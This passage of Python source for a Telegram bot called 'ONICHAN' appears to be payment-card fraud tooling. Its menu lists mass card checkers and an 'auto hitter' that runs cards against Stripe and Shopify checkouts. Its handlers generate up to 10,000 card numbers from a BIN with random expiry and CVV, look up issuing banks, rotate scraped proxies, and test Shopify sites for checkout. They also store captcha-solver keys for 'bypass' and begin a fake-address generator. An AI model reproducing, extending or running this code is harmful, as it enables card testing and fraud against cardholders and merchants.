🧹 <b>CLEANER</b>
/clean · /filter
{sep}
📋 <b>MASS</b> (Free:5 | Prem:20 | Owner:50)
/mss · /mpp · /mbu · /msstxt
{sep}""")
    
    if is_premium_user:
        text += f"""
💎 <b>PREMIUM GATES</b>
/pp · /ppv · /str · /b3n · /rz
/sor · /st5 · /dep · /auz · /sh6
{sep}
🎯 <b>AUTO HITTER</b>
/co [url] [cc] — Stripe/Shopify
{sep}"""
    
    if is_owner_user:
        text += f"""
👑 <b>ADMIN</b>
/approve · /premium · /ban · /unban
/addadmin · /genkey · /keys · /broadcast
{sep}"""
    
    text += f"""
📞 @{SUPPORT_USERNAME} | 📢 @{CHANNEL_USERNAME}"""
    
    keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        if len(text) <= 1024:
            await update.message.reply_animation(
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
    except Exception as e:
        await update.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )

# ============================================================================
# PROXY SCRAPER
# ============================================================================

@require_approval
async def proxy_scraper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Scrape free proxies from pool"""
    user = update.effective_user

    loading_msg = await update.message.reply_text(ae("🔄 Fetching proxies from pool..."))

    try:
        from modules.proxy_scraper_engine import get_pool_proxies
        pool = get_pool_proxies(alive_only=True, limit=15)

        if pool:
            proxies = []
            for p in pool:
                ptype = p.get('proxy_type', 'HTTP').upper()
                host = p['host']
                port = p['port']
                if ptype in ('SOCKS5', 'SOCKS4'):
                    proxies.append(f"{ptype.lower()}://{host}:{port}")
                else:
                    proxies.append(f"{host}:{port}")

            sep = "━━━━━━━━━━━━━━━━━━━━"
            text = ae(f"""💜 <b>ONICHAN • PROXIES</b>
{sep}
📊 <b>Found</b> : {len(proxies)}
{sep}
""")
            for i, proxy in enumerate(proxies, 1):
                text += f"{i}. <code>{proxy}</code>\n"

            text += f"""{sep}
⚠️ Free proxies may be slow — test first
👤 @{user.username or user.first_name}"""

            await loading_msg.edit_text(text, parse_mode=ParseMode.HTML)
        else:
            await loading_msg.edit_text(ae("❌ No proxies in pool. Try again later."))

    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# USER INFO COMMAND
# ============================================================================

@require_approval
async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user information with nice card design"""
    user = update.effective_user
    rank = get_user_rank(user.id)
    
    # Get premium expiry if premium user
    expiry_text = "N/A"
    if is_premium(user.id):
        try:
            with open(DB_PREMIUM, 'r') as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 2 and int(parts[0]) == user.id:
                        expiry_text = parts[1]
                        break
        except:
            expiry_text = "Unknown"
    
    # Get approved cards count for this user
    try:
        user_approved_count = get_user_approved_cards(user.id)
    except:
        user_approved_count = 0
    
    # Create info card with GIF
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • USER INFO</b>
{sep}
👤 <b>Name</b>     : {user.first_name}
🆔 <b>ID</b>       : <code>{user.id}</code>
📛 <b>User</b>     : @{user.username or 'None'}
👑 <b>Rank</b>     : {rank}
📅 <b>Expiry</b>   : {expiry_text}
{sep}
⚡ @{BOT_USERNAME}""")
    
    keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send with GIF
    try:
        info_gif = get_sexy_anime_gif("welcome")
        await update.message.reply_animation(
            animation=info_gif,
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    except:
        # Fallback without GIF
        await update.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )

# ============================================================================
# CARD GENERATOR
# ============================================================================

@require_approval
async def card_generator(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if not context.args:
        sep = "────────────────────────"
        await update.message.reply_text(
            f"💜 <b>ONICHAN • CC GENERATOR</b>\n\n"
            f"{sep}\n\n"
            f"📝 <b>Usage</b>: <code>/gen &lt;bin&gt;[|mm|yy|cvv] [count]</code>\n\n"
            f"📌 <b>Examples</b>:\n"
            f"<code>/gen 415920</code>\n"
            f"<code>/gen 415920|xx|26|xxx 20</code>\n"
            f"<code>/gen 374155|12|xx|xxxx 500</code>\n\n"
            f"<i>x = random. Up to 10,000 cards.\n"
            f"File auto-sent when &gt; 10 cards.</i>",
            parse_mode=ParseMode.HTML
        )
        return

    input_text = ' '.join(context.args)
    parsed = parse_gen_format(input_text)

    if not parsed:
        await update.message.reply_text(f"{EMOJI['declined']} Invalid format.\nUsage: <code>/gen &lt;bin6+&gt;[|mm|yy|cvv] [count]</code>", parse_mode=ParseMode.HTML)
        return

    bin_number, custom_month, custom_year, custom_cvv, count = parsed

    if not bin_number.isdigit() or len(bin_number) < 6:
        await update.message.reply_text(f"{EMOJI['declined']} Invalid BIN! Must be at least 6 digits.", parse_mode=ParseMode.HTML)
        return

    MAX_GEN_CARDS = 10000
    if count > MAX_GEN_CARDS:
        count = MAX_GEN_CARDS

    t0 = time.time()
    generated_cards = generate_cards(bin_number, count, custom_month, custom_year, custom_cvv)
    brand = get_card_brand(bin_number)

    bin_info = {}
    try:
        bin_info = lookup_bin(bin_number + "0" * (16 - len(bin_number)))
    except:
        try:
            from modules.gate_checker import get_bin_info
            bin_info = get_bin_info(bin_number + "0" * (16 - len(bin_number)))
        except:
            pass

    elapsed_ms = round((time.time() - t0) * 1000)

    if not generated_cards:
        await update.message.reply_text(f"{EMOJI['declined']} Failed to generate cards.", parse_mode=ParseMode.HTML)
        return

    is_amex = bin_number.startswith("34") or bin_number.startswith("37")
    card_len = 15 if is_amex else 16
    display_prefix = bin_number + "x" * (card_len - len(bin_number))

    b_brand   = bin_info.get("brand", "") or bin_info.get("scheme", "") or brand
    b_type    = bin_info.get("type", "") or "?"
    b_level   = bin_info.get("category", "") or bin_info.get("level", "") or ""
    b_bank    = bin_info.get("bank", "") or bin_info.get("issuer", "") or "─"
    b_country = bin_info.get("country_name", "") or bin_info.get("country", "") or "?"
    b_iso     = bin_info.get("country_code", "") or bin_info.get("iso", "") or "?"
    b_flag    = bin_info.get("flag", "") or bin_info.get("emoji", "") or get_flag_emoji(b_iso)
    bin_line  = f"<code>{bin_number[:6]}</code> — <code>{b_brand}</code> — <code>{b_type}</code>"

    gen_sep = "────────────────────────"

    cb_data = f"regen:{bin_number}:{custom_month or 'xx'}:{custom_year or 'xx'}:{custom_cvv or 'xxx'}:{count}"
    if len(cb_data) > 64:
        cb_data = cb_data[:64]
    keyboard = [[_btn("Regenerate", style="success", icon=EID["regenerate"], callback_data=cb_data)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    context.user_data['last_gen'] = {
        'bin': bin_number, 'month': custom_month,
        'year': custom_year, 'cvv': custom_cvv, 'count': count
    }

    # ── Build BIN info footer (shared by both paths) ──────────────────────────
    def _bin_footer():
        t = (
            f"{gen_sep}\n\n"
            f"💠 <b>Network</b>   : {bin_line}\n"
        )
        if b_level and b_level != "UNKNOWN":
            t += f"📋 <b>Level</b>     : <code>{b_level}</code>\n"
        t += (
            f"🏦 <b>Bank</b>      : <code>{b_bank}</code>\n"
            f"🌍 <b>Country</b>   : {b_flag} <code>{b_country}</code> (<code>{b_iso}</code>)\n\n"
            f"⏱ <b>Time</b>      : <code>{elapsed_ms}ms</code>"
        )
        return t

    # ── More than 10 cards → send file only (no inline card list) ───────────
    if len(generated_cards) > 10:
        from io import BytesIO as _BytesIO

        all_cards_txt = "\n".join(c["full"] for c in generated_cards)
        fname         = f"Onichan_Gen_By_{user.id}_{len(generated_cards)}.txt"
        file_bytes    = _BytesIO(all_cards_txt.encode("utf-8"))
        file_bytes.name = fname

        caption_level = f"\n📋 <b>Level</b>   : <code>{b_level}</code>" if b_level and b_level != "UNKNOWN" else ""
        caption = ae(
            f"📁 <b>ONICHAN • CC GENERATOR</b>\n"
            f"{gen_sep}\n"
            f"💳 <b>BIN</b>      : <code>{display_prefix}</code>\n"
            f"💠 <b>Network</b>  : <code>{b_brand}</code> — <code>{b_type}</code>{caption_level}\n"
            f"🏦 <b>Bank</b>     : <code>{b_bank}</code>\n"
            f"🌍 <b>Country</b>  : {b_flag} <code>{b_country}</code> (<code>{b_iso}</code>)\n"
            f"{gen_sep}\n"
            f"📊 <b>Count</b>    : <code>{len(generated_cards)} cards</code>\n"
            f"📅 <b>Expiry</b>   : <code>{'custom' if custom_month or custom_year else 'random'}</code>\n"
            f"🔐 <b>CVV</b>      : <code>{'custom' if custom_cvv else 'random'}</code>\n"
            f"⏱ <b>Time</b>     : <code>{elapsed_ms}ms</code>"
        )
        await update.message.reply_document(
            document=file_bytes,
            filename=fname,
            caption=caption,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
        )
        return

    # ── 10 or fewer cards → show all inline ──────────────────────────────────
    cards_text = "\n".join(f"<code>{c['full']}</code>" for c in generated_cards)
    text = ae(
        f"💜 <b>ONICHAN • CC GENERATOR</b>\n\n"
        f"{gen_sep}\n\n"
        f"🔢 <b>BIN</b>       : <code>{display_prefix}</code>\n"
        f"📊 <b>Generated</b> : <code>{len(generated_cards)}/{count}</code>\n\n"
        f"{gen_sep}\n\n"
        f"{cards_text}\n\n"
        + _bin_footer()
    )

    await _reply_with_gif(update.message, "success", text, reply_markup=reply_markup)


async def regenerate_cards_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data.startswith("regen:"):
        parts = query.data.split(":")
        if len(parts) < 6:
            await query.answer("Invalid data", show_alert=True)
            return
        bin_number = parts[1]
        custom_month = parts[2] if parts[2] != "xx" else None
        custom_year = parts[3] if parts[3] != "xx" else None
        custom_cvv = parts[4] if parts[4] != "xxx" else None
        count = min(int(parts[5]), 50)
    elif query.data == "regen_cards":
        if 'last_gen' not in context.user_data:
            await query.answer("No previous generation found! Use /gen first.", show_alert=True)
            return
        params = context.user_data['last_gen']
        bin_number = params['bin']
        custom_month = params['month']
        custom_year = params['year']
        custom_cvv = params['cvv']
        count = params['count']
    else:
        await query.answer("Unknown", show_alert=True)
        return

    t0 = time.time()
    generated_cards = generate_cards(bin_number, count, custom_month, custom_year, custom_cvv)
    brand = get_card_brand(bin_number)

    bin_info = {}
    try:
        bin_info = lookup_bin(bin_number + "0" * (16 - len(bin_number)))
    except:
        try:
            from modules.gate_checker import get_bin_info
            bin_info = get_bin_info(bin_number + "0" * (16 - len(bin_number)))
        except:
            pass

    elapsed_ms = round((time.time() - t0) * 1000)

    if not generated_cards:
        await query.answer("Failed to generate", show_alert=True)
        return

    is_amex = bin_number.startswith("34") or bin_number.startswith("37")
    card_len = 15 if is_amex else 16
    display_prefix = bin_number + "x" * (card_len - len(bin_number))

    cards_text = "\n".join(f"<code>{c['full']}</code>" for c in generated_cards)

    b_brand = bin_info.get("brand", "") or bin_info.get("scheme", "") or brand
    b_type = bin_info.get("type", "") or "?"
    b_level = bin_info.get("category", "") or bin_info.get("level", "") or ""
    b_bank = bin_info.get("bank", "") or bin_info.get("issuer", "") or "─"
    b_country = bin_info.get("country_name", "") or bin_info.get("country", "") or "?"
    b_iso = bin_info.get("country_code", "") or bin_info.get("iso", "") or "?"
    b_flag = bin_info.get("flag", "") or bin_info.get("emoji", "") or get_flag_emoji(b_iso)
    bin_line = f"<code>{bin_number[:6]}</code> — <code>{b_brand}</code> — <code>{b_type}</code>"

    gen_sep = "────────────────────────"
    text = (
        f"💜 <b>ONICHAN • CC GENERATOR</b>\n\n"
        f"{gen_sep}\n\n"
        f"🔢 <b>BIN</b>         : <code>{display_prefix}</code>\n"
        f"📊 <b>Generated</b>   : <code>{len(generated_cards)}/{count}</code>\n\n"
        f"{gen_sep}\n\n"
        f"{cards_text}\n\n"
        f"{gen_sep}\n\n"
        f"💠 <b>Network</b>     : {bin_line}\n"
    )
    if b_level and b_level != "UNKNOWN":
        text += f"📋 <b>Level</b>       : <code>{b_level}</code>\n"
    text += (
        f"🏦 <b>Bank</b>        : <code>{b_bank}</code>\n"
        f"🌍 <b>Country</b>     : {b_flag} <code>{b_country}</code> (<code>{b_iso}</code>)\n\n"
        f"⏱ <b>Time</b>        : <code>{elapsed_ms}ms</code>"
    )
    text = ae(text)

    cb_data = f"regen:{bin_number}:{custom_month or 'xx'}:{custom_year or 'xx'}:{custom_cvv or 'xxx'}:{count}"
    if len(cb_data) > 64:
        cb_data = cb_data[:64]
    keyboard = [[_btn("Regenerate", style="success", icon=EID["regenerate"], callback_data=cb_data)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        await query.answer(f"{EMOJI_PLAIN['regenerate']} Regenerated!")
    except:
        await query.answer("Error regenerating", show_alert=True)

# ============================================================================
# USER CONFIG - Sites & Proxy Settings
# ============================================================================

@require_approval
async def user_config_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manage user configuration for sites and proxies"""
    user = update.effective_user
    
    if context.args:
        action = context.args[0].lower()
        
        if action == "site" and len(context.args) >= 2:
            site_url = context.args[1]
            
            user_config = get_user_config(user.id)
            saved_proxy = user_config.get('proxy')
            
            status_msg = await update.message.reply_text(
                f"⏳ <b>Checking Site Compatibility...</b>\n\n"
                f"🌐 <code>{site_url}</code>\n"
                f"🔍 Testing checkout flow...",
                parse_mode=ParseMode.HTML
            )
            
            try:
                from modules.shopify_auto import check_site_compatibility
                is_compatible, details = await check_site_compatibility(site_url, saved_proxy)
                
                if is_compatible:
                    set_user_site(user.id, site_url)
                    product_price = details.get('price', 0)
                    product_title = details.get('product', 'Unknown')[:40]
                    await status_msg.edit_text(
                        f"✅ <b>Site Compatible & Saved!</b>\n\n"
                        f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
                        f"💰 <b>Amount:</b> ${product_price:.2f}\n"
                        f"📦 <b>Product:</b> {product_title}\n"
                        f"✓ Checkout: {details.get('checkout_type', 'OK')}\n\n"
                        f"💡 Now use <code>/sh card</code> without site!",
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await status_msg.edit_text(
                        f"❌ <b>Site Not Compatible!</b>\n\n"
                        f"🌐 <code>{site_url}</code>\n"
                        f"⚠️ <b>Error:</b> {details.get('error', 'Unknown error')}\n\n"
                        f"Site was NOT saved. Try a different Shopify site.",
                        parse_mode=ParseMode.HTML
                    )
            except Exception as e:
                await status_msg.edit_text(
                    f"❌ <b>Site Check Failed!</b>\n\n"
                    f"🌐 <code>{site_url}</code>\n"
                    f"⚠️ <b>Error:</b> {str(e)[:50]}\n\n"
                    f"Site was NOT saved.",
                    parse_mode=ParseMode.HTML
                )
            return
        
        elif action == "proxy" and len(context.args) >= 2:
            proxy = context.args[1]
            
            status_msg = await update.message.reply_text(
                f"⏳ <b>Checking Proxy...</b>\n\n"
                f"🔒 <code>{proxy}</code>\n"
                f"Testing connection...",
                parse_mode=ParseMode.HTML
            )
            
            is_live, result = await check_proxy_live(proxy)
            
            if is_live:
                set_user_proxy(user.id, proxy)
                await status_msg.edit_text(
                    f"✅ <b>Proxy Saved!</b>\n\n"
                    f"🔒 <b>Proxy:</b> <code>{proxy}</code>\n"
                    f"🌐 <b>IP:</b> <code>{result}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await status_msg.edit_text(
                    f"❌ <b>Proxy Dead!</b>\n\n"
                    f"🔒 <code>{proxy}</code>\n"
                    f"⚠️ <b>Error:</b> {result}\n\n"
                    f"Proxy not saved.",
                    parse_mode=ParseMode.HTML
                )
            return
        
        elif action == "clear":
            if len(context.args) >= 2:
                sub = context.args[1].lower()
                if sub == "sites":
                    clear_all_sites(user.id)
                    await update.message.reply_text(ae("✅ All sites cleared!"), parse_mode=ParseMode.HTML)
                    return
                elif sub == "proxies":
                    clear_all_proxies(user.id)
                    await update.message.reply_text(ae("✅ All proxies cleared!"), parse_mode=ParseMode.HTML)
                    return
            clear_all_sites(user.id)
            clear_all_proxies(user.id)
            await update.message.reply_text(ae("✅ All settings cleared!"), parse_mode=ParseMode.HTML)
            return
        
        elif action == "clean":
            removed = clean_invalid_sites(user.id)
            await update.message.reply_text(ae(f"✅ Cleaned {removed} invalid entries!"), parse_mode=ParseMode.HTML)
            return
    
    config = get_user_config(user.id)
    current_proxy = config.get('proxy', 'Not set')
    saved_sites = config.get('sites', [])
    saved_proxies = config.get('proxies', [])
    
    sites_list = ""
    if saved_sites:
        for i, site in enumerate(saved_sites, 1):
            sites_list += f"  {i}. <code>{site}</code>\n"
    else:
        sites_list = "  None saved\n"
    
    proxies_list = ""
    if saved_proxies:
        for i, proxy in enumerate(saved_proxies, 1):
            proxies_list += f"  {i}. <code>{proxy}</code>\n"
    else:
        proxies_list = "  None saved\n"
    
    text = ae(f"""⚙️ <b>USER CONFIGURATION</b>

━━━━━━━━━━━━━━━━━━━━━━

🌐 <b>Sites ({len(saved_sites)}):</b>
{sites_list}
🔒 <b>Proxies ({len(saved_proxies)}):</b>
{proxies_list}
━━━━━━━━━━━━━━━━━━━━━━

📝 <b>COMMANDS:</b>
<code>/config site example.com</code>
<code>/config proxy ip:port:user:pass</code>
<code>/config clear</code> - Clear all
<code>/config clear sites</code>
<code>/config clear proxies</code>
<code>/config clean</code> - Remove invalid

━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Once site is set, use:</b>
<code>/sh card|mm|yy|cvv</code>""")
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

# ============================================================================
# SETMAIL - Set billing email for Auto Hitter
# ============================================================================

@require_approval
async def setmail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set billing email for Stripe checkout"""
    user = update.effective_user
    
    if not context.args:
        current_email = get_user_email(user.id)
        if current_email:
            await update.message.reply_text(
                f"📧 <b>Your Billing Email</b>\n\n"
                f"Current: <code>{current_email}</code>\n\n"
                f"<b>Usage:</b>\n"
                f"<code>/setmail email@example.com</code> - Set email\n"
                f"<code>/setmail off</code> - Remove email",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "📧 <b>Set Billing Email</b>\n\n"
                "No email set. Checkout will use random email.\n\n"
                "<b>Usage:</b>\n"
                "<code>/setmail email@example.com</code>",
                parse_mode=ParseMode.HTML
            )
        return
    
    email = context.args[0].strip()
    
    if email.lower() in ['off', 'clear', 'remove', 'delete']:
        clear_user_email(user.id)
        await update.message.reply_text(
            "✅ <b>Email Removed!</b>\n\nCheckout will now use random email.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if '@' not in email or '.' not in email:
        await update.message.reply_text(
            "❌ Invalid email format!\n\nExample: <code>/setmail user@gmail.com</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    set_user_email(user.id, email)
    await update.message.reply_text(
        f"✅ <b>Email Saved!</b>\n\n"
        f"📧 <code>{email}</code>\n\n"
        f"This email will be used in checkout forms.",
        parse_mode=ParseMode.HTML
    )

# ============================================================================
# CAPKEY - Set captcha solver API key
# ============================================================================

@require_approval
async def capkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set captcha solver API key for auto hitter"""
    user = update.effective_user
    
    if not context.args:
        current_key = get_captcha_key(user.id)
        if current_key:
            masked_key = current_key[:8] + "..." + current_key[-4:] if len(current_key) > 12 else "***"
            await update.message.reply_text(
                f"🔑 <b>Captcha Solver Key</b>\n\n"
                f"Current: <code>{masked_key}</code>\n\n"
                f"<b>Supported Services:</b>\n"
                f"• 2Captcha\n"
                f"• Anti-Captcha\n"
                f"• CapMonster\n"
                f"• hCaptcha Solver\n\n"
                f"<b>Usage:</b>\n"
                f"<code>/capkey YOUR_API_KEY</code>\n"
                f"<code>/capkey off</code> - Remove key",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "🔑 <b>Set Captcha Solver Key</b>\n\n"
                "No key set. Captcha bypass will use built-in methods.\n\n"
                "<b>Supported Services:</b>\n"
                "• 2Captcha\n"
                "• Anti-Captcha\n"
                "• CapMonster\n"
                "• hCaptcha Solver\n\n"
                "<b>Usage:</b>\n"
                "<code>/capkey YOUR_API_KEY</code>",
                parse_mode=ParseMode.HTML
            )
        return
    
    api_key = context.args[0].strip()
    
    if api_key.lower() in ['off', 'clear', 'remove', 'delete']:
        clear_captcha_key(user.id)
        await update.message.reply_text(
            "✅ <b>Captcha Key Removed!</b>\n\nWill use built-in bypass methods.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if len(api_key) < 10:
        await update.message.reply_text(
            "❌ Invalid API key! Key must be at least 10 characters.",
            parse_mode=ParseMode.HTML
        )
        return
    
    set_captcha_key(user.id, api_key)
    masked_key = api_key[:8] + "..." + api_key[-4:] if len(api_key) > 12 else "***"
    await update.message.reply_text(
        f"✅ <b>Captcha Key Saved!</b>\n\n"
        f"🔑 <code>{masked_key}</code>\n\n"
        f"This key will be used for captcha solving.",
        parse_mode=ParseMode.HTML
    )

# ============================================================================
# BIN LOOKUP
# ============================================================================

@require_approval
async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lookup BIN information"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/bin 424242</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    bin_number = ''.join(c for c in context.args[0] if c.isdigit())[:8]
    
    if len(bin_number) < 6:
        await update.message.reply_text(ae("❌ Invalid BIN! Must be at least 6 digits."))
        return
    
    loading_msg = await update.message.reply_text(ae("🔍 Looking up BIN..."))
    
    try:
        from modules.gate_checker import get_bin_info
        data = get_bin_info(bin_number)
        
        if data:
            sep = "━━━━━━━━━━━━━━━━━━━━"
            text = ae(f"""💜 <b>ONICHAN • BIN</b>
{sep}
🔢 <b>BIN</b>     : <code>{data.get('bin', bin_number)}</code>
💳 <b>Brand</b>   : {data.get('brand', 'Unknown')}
🎴 <b>Type</b>    : {data.get('type', 'Unknown')}
💰 <b>Level</b>   : {data.get('level', 'Unknown')}
🏦 <b>Bank</b>    : {data.get('bank', 'Unknown')}
🌍 <b>Country</b> : {data.get('emoji', '')} {data.get('country', 'Unknown')} ({data.get('country_code', 'XX')})
{sep}""")
            try: await loading_msg.delete()
            except Exception: pass
            await _reply_with_gif(update.message, "welcome", text)
        else:
            await loading_msg.edit_text(ae("❌ BIN not found in database."))
            
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# FAKE ADDRESS GENERATOR
# ============================================================================

FAKER_LOCALES = {
    # North America
    'us': ('en_US', '🇺🇸', 'United States'), 'usa': ('en_US', '🇺🇸', 'United States'),
    'united states': ('en_US', '🇺🇸', 'United States'), 'america': ('en_US', '🇺🇸', 'United States'),
    'ca': ('en_CA', '🇨🇦', 'Canada'), 'canada': ('en_CA', '🇨🇦', 'Canada'),
    'mx': ('es_MX', '🇲🇽', 'Mexico'), 'mexico': ('es_MX', '🇲🇽', 'Mexico'),
    # Europe
    'uk': ('en_GB', '🇬🇧', 'United Kingdom'), 'gb': ('en_GB', '🇬🇧', 'United Kingdom'),
    'united kingdom': ('en_GB', '🇬🇧', 'United Kingdom'), 'britain': ('en_GB', '🇬🇧', 'United Kingdom'),
    'england': ('en_GB', '🇬🇧', 'United Kingdom'),
    'de': ('de_DE', '🇩🇪', 'Germany'), 'germany': ('de_DE', '🇩🇪', 'Germany'),
    'fr': ('fr_FR', '🇫🇷', 'France'), 'france': ('fr_FR', '🇫🇷', 'France'),
    'es': ('es_ES', '🇪🇸', 'Spain'), 'spain': ('es_ES', '🇪🇸', 'Spain'),
    'it': ('it_IT', '🇮🇹', 'Italy'), 'italy': ('it_IT', '🇮🇹', 'Italy'),
    'nl': ('nl_NL', '🇳🇱', 'Netherlands'), 'netherlands': ('nl_NL', '🇳🇱', 'Netherlands'),
    'holland': ('nl_NL', '🇳🇱', 'Netherlands'),
    'be': ('nl_BE', '🇧🇪', 'Belgium'), 'belgium': ('nl_BE', '🇧🇪', 'Belgium'),
    'at': ('de_AT', '🇦🇹', 'Austria'), 'austria': ('de_AT', '🇦🇹', 'Austria'),
    'ch': ('de_CH', '🇨🇭', 'Switzerland'), 'switzerland': ('de_CH', '🇨🇭', 'Switzerland'),
    'pt': ('pt_PT', '🇵🇹', 'Portugal'), 'portugal': ('pt_PT', '🇵🇹', 'Portugal'),
    'ie': ('en_IE', '🇮🇪', 'Ireland'), 'ireland': ('en_IE', '🇮🇪', 'Ireland'),
    'dk': ('da_DK', '🇩🇰', 'Denmark'), 'denmark': ('da_DK', '🇩🇰', 'Denmark'),
    'fi': ('fi_FI', '🇫🇮', 'Finland'), 'finland': ('fi_FI', '🇫🇮', 'Finland'),
    'no': ('no_NO', '🇳🇴', 'Norway'), 'norway': ('no_NO', '🇳🇴', 'Norway'),
    'se': ('sv_SE', '🇸🇪', 'Sweden'), 'sweden': ('sv_SE', '🇸🇪', 'Sweden'),
    'pl': ('pl_PL', '🇵🇱', 'Poland'), 'poland': ('pl_PL', '🇵🇱', 'Poland'),
    'cz': ('cs_CZ', '🇨🇿', 'Czech Republic'), 'czech': ('cs_CZ', '🇨🇿', 'Czech Republic'),
    'sk': ('sk_SK', '🇸🇰', 'Slovakia'), 'slovakia': ('sk_SK', '🇸🇰', 'Slovakia'),
    'hu': ('hu_HU', '🇭🇺', 'Hungary'), 'hungary': ('hu_HU', '🇭🇺', 'Hungary'),
    'ro': ('ro_RO', '🇷🇴', 'Romania'), 'romania': ('ro_RO', '🇷🇴', 'Romania'),
    'bg': ('bg_BG', '🇧🇬', 'Bulgaria'), 'bulgaria': ('bg_BG', '🇧🇬', 'Bulgaria'),
    'gr': ('el_GR', '🇬🇷', 'Greece'), 'greece': ('el_GR', '🇬🇷', 'Greece'),
    'hr': ('hr_HR', '🇭🇷', 'Croatia'), 'croatia': ('hr_HR', '🇭🇷', 'Croatia'),
    'si': ('sl_SI', '🇸🇮', 'Slovenia'), 'slovenia': ('sl_SI', '🇸🇮', 'Slovenia'),
    'ua': ('uk_UA', '🇺🇦', 'Ukraine'), 'ukraine': ('uk_UA', '🇺🇦', 'Ukraine'),
    'ru': ('ru_RU', '🇷🇺', 'Russia'), 'russia': ('ru_RU', '🇷🇺', 'Russia'),
    'lt': ('lt_LT', '🇱🇹', 'Lithuania'), 'lithuania': ('lt_LT', '🇱🇹', 'Lithuania'),
    'lv': ('lv_LV', '🇱🇻', 'Latvia'), 'latvia': ('lv_LV', '🇱🇻', 'Latvia'),
    'ee': ('et_EE', '🇪🇪', 'Estonia'), 'estonia': ('et_EE', '🇪🇪', 'Estonia'),
    # Asia
    'in': ('en_IN', '🇮🇳', 'India'), 'india': ('en_IN', '🇮🇳', 'India'),
    'cn': ('zh_CN', '🇨🇳', 'China'), 'china': ('zh_CN', '🇨🇳', 'China'),
    'jp': ('ja_JP', '🇯🇵', 'Japan'), 'japan': ('ja_JP', '🇯🇵', 'Japan'),
    'kr': ('ko_KR', '🇰🇷', 'South Korea'), 'korea': ('ko_KR', '🇰🇷', 'South Korea'),
    'south korea': ('ko_KR', '🇰🇷', 'South Korea'),
    'th': ('th_TH', '🇹🇭', 'Thailand'), 'thailand': ('th_TH', '🇹🇭', 'Thailand'),
    'id': ('id_ID', '🇮🇩', 'Indonesia'), 'indonesia': ('id_ID', '🇮🇩', 'Indonesia'),
    'ph': ('en_PH', '🇵🇭', 'Philippines'), 'philippines': ('en_PH', '🇵🇭', 'Philippines'),
    'tw': ('zh_TW', '🇹🇼', 'Taiwan'), 'taiwan': ('zh_TW', '🇹🇼', 'Taiwan'),
    'bd': ('bn_BD', '🇧🇩', 'Bangladesh'), 'bangladesh': ('bn_BD', '🇧🇩', 'Bangladesh'),
    'az': ('az_AZ', '🇦🇿', 'Azerbaijan'), 'azerbaijan': ('az_AZ', '🇦🇿', 'Azerbaijan'),
    'ge': ('ka_GE', '🇬🇪', 'Georgia'), 'georgia': ('ka_GE', '🇬🇪', 'Georgia'),
    'am': ('hy_AM', '🇦🇲', 'Armenia'), 'armenia': ('hy_AM', '🇦🇲', 'Armenia'),
    # Middle East
    'tr': ('tr_TR', '🇹🇷', 'Turkey'), 'turkey': ('tr_TR', '🇹🇷', 'Turkey'),
    'turkiye': ('tr_TR', '🇹🇷', 'Turkey'),
    'ae': ('ar_AE', '🇦🇪', 'UAE'), 'uae': ('ar_AE', '🇦🇪', 'UAE'),
    'dubai': ('ar_AE', '🇦🇪', 'UAE'), 'united arab emirates': ('ar_AE', '🇦🇪', 'UAE'),
    'sa': ('ar_SA', '🇸🇦', 'Saudi Arabia'), 'saudi': ('ar_SA', '🇸🇦', 'Saudi Arabia'),
    'saudi arabia': ('ar_SA', '🇸🇦', 'Saudi Arabia'),
    'il': ('he_IL', '🇮🇱', 'Israel'), 'israel': ('he_IL', '🇮🇱', 'Israel'),
    'ir': ('fa_IR', '🇮🇷', 'Iran'), 'iran': ('fa_IR', '🇮🇷', 'Iran'),
    'jo': ('ar_JO', '🇯🇴', 'Jordan'), 'jordan': ('ar_JO', '🇯🇴', 'Jordan'),
    'eg': ('ar_EG', '🇪🇬', 'Egypt'), 'egypt': ('ar_EG', '🇪🇬', 'Egypt'),
    # Oceania
    'au': ('en_AU', '🇦🇺', 'Australia'), 'australia': ('en_AU', '🇦🇺', 'Australia'),
